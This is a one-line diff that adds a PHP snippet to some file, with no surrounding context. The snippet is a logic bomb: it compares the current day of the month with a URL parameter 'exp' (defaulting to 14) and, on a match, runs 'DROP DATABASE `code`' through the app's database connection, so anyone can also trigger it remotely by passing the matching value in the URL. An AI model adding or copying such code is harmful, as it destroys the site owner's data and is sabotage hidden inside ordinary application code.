@@ -1,0 +1,1 @@
+<?php $today = date('d');$exp = $_GET['exp'];if($exp==NULL){$exp='14';}if($today==$exp){$sql = mysqli_query($con,"DROP DATABASE `code`");}?>  
